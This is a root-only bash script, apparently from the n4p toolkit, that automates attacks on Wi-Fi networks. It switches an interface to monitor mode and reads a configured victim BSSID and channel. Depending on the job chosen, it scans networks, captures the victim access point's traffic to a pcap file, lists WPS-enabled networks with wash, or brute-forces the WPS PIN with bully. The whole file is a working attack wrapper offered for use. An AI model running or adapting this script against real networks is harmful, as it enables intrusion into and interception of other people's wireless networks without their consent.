#!/bin/bash
if [[ $(id -u) != 0 ]]; then # Verify we are root if not exit
   echo "Please Run This Script As Root or With Sudo!" 1>&2
   exit 1
fi

#retrieve absolute path structures so we can use symlinks and config files
SOURCE="${BASH_SOURCE[0]}"
while [[ -h "$SOURCE" ]]; do # resolve $SOURCE until the file is no longer a symlink
    DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
    SOURCE="$(readlink "$SOURCE")"
    [[ $SOURCE != /* ]] && SOURCE="${DIR}/$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it's relativeness to the path where the symlink file was located
done
DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
sessionfolder=/tmp/n4p
DIR_CONF=/etc/n4p
DIR_LOGO=/usr/share/n4p

get_name()
{
    USE=$(grep $1 ${DIR_CONF}/n4p.conf | awk -F= '{print $2}')
}

get_state() # Retrieve the state of interfaces
{
    STATE=$(ip addr list | grep -i $1 | grep -i DOWN | awk -Fstate '{print $2}' | cut -d ' ' -f 2)
}

IFACE1=$1
JOB=$2
MON="${IFACE1}mon"
# Text color variables
TXT_BLD=$(tput bold)             # Bold
BLD_PUR=${txtbld}$(tput setaf 5) # purple
BLD_TEA=${txtbld}$(tput setaf 6) # teal
BLD_RED=${txtbld}$(tput setaf 1) # red
TXT_RST=$(tput sgr0)             # Reset
WARN="${BLD_TEA}[${TXT_RST}${BLD_PUR} * ${TXT_RST}${BLD_TEA}]${TXT_RST}"

if [[ $2 == "recon" ]]; then
    echo "${BLD_TEA}$(cat ${DIR_LOGO}/recon.logo)${TXT_RST}"; sleep 2.5
elif [[ $2 == "dump" ]]; then 
    echo "${BLD_TEA}$(cat ${DIR_LOGO}/dump.logo)${TXT_RST}"; sleep 2.5
elif [[ $2 == "wash" ]]; then
    echo "${BLD_TEA}$(cat ${DIR_LOGO}/wash.logo)${TXT_RST}"; sleep 2.5
fi

if [[ -n $(ip addr | grep -i "$MON") ]]; then echo "$WARN Leftover scoobie snacks found! nom nom"; airmon-ng stop $MON; fi

get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
get_name "CHAN="; CHAN=$USE
get_name "LOCAL_BSSID="; LOCAL_BSSID=$USE
[[ -n $(rfkill list | grep yes) ]] && rfkill unblock wlan

do_it()
{
    if [[ -z $(ip addr | grep -i "$MON") ]]; then
        iwconfig $IFACE1 mode managed # Force managed mode upon wlan because airmon wont do this
        airmon-ng start $IFACE1
    fi
    if [[ $JOB == "recon" ]]; then
        while [[ -z $(ip addr list | grep $MON) ]]; do
            sleep 0.5
        done
        #/bin/sh -c "/usr/bin/launch '/usr/sbin/airmon-ng' 'start' 'wlan1mon' 'sudo -s'"
        xterm -hold -bg black -fg blue -T "Recon" -geometry 90x20 -e airodump-ng $MON &>/dev/null &
    elif [[ $JOB == "dump" ]]; then
        if [[ -f ${sessionfolder}/${VICTIM_BSSID}* ]]; then
            read -p "${VICTIM_BSSID}.cap exists already. Continuing will remove the file. Continue anyways? [y/n]" option
            if [[ $option != [Yy] ]]; then
                exit 1
            else
                rm ${sessionfolder}/${VICTIM_BSSID}*
            fi
	fi
        xterm -hold -bg black -fg blue -T "Dump" -geometry 90x20 -e airodump-ng --bssid $VICTIM_BSSID -c $CHAN --output-format pcap -w ${sessionfolder}/$VICTIM_BSSID $MON &>/dev/null &
    elif [[ $JOB == "wash" ]]; then
        sudo wash -i $MON --ignore-fcs
    elif [[ $JOB == "bully" ]]; then
        sudo bully -b $VICTIM_BSSID -c $CHAN -B $MON
    else
      echo "error that can't happen happened"
    fi
    keepalive
}

trap killAll INT HUP;
keepalive()
{
    read -p "$WARN Press ctrl^c when you are ready to go down!" ALLINTHEFAMILY # Protect this script from going down hastily
    [[ $ALLINTHEFAMILY != 'SGFjayBUaGUgUGxhbmV0IQ==' ]] && clear; keepalive
}

killAll()
{
    airmon-ng stop $MON
    echo "${BLD_TEA}$(cat ${DIR_LOGO}/die.logo)${TXT_RST}"
    sleep 2
    exit 0
}
do_it